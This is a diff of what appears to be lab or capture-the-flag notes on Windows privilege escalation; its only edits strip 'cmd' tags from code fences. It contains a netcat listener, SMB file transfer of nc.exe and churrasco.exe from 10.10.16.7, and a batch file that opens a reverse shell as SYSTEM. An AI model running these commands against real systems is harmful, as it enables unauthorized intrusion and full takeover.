@@ -65,7 +65,7 @@ rlwrap nc -nlvp 9000
 
 - Check user privileges
 
-```cmd
+```
 whoami /priv
 ```
 
@@ -73,7 +73,7 @@ whoami /priv
 
 - Check OS Version
 
-```cmd
+```
 systeminfo
 ```
 
@@ -87,23 +87,23 @@ impacket-smbserver smbFolder -smb $(pwd) -smb2support
 
 https://github.com/int0x33/nc.exe/blob/master/nc.exe
 
-```cmd
+```
 copy \\10.10.16.7\smbFolder\nc.exe
 ```
 
 https://github.com/Re4son/Churrasco/blob/master/churrasco.exe
 
-```cmd
+```
 copy \\10.10.16.7\smbFolder\churrasco.exe
 ```
 
 - Run reverse shell as system
 
-```cmd
+```
 echo nc.exe 10.10.16.7 4444 -e cmd.exe > exploit.bat
 ```
 
-```cmd
+```
 churrasco.exe -d exploit.bat
 ```
 
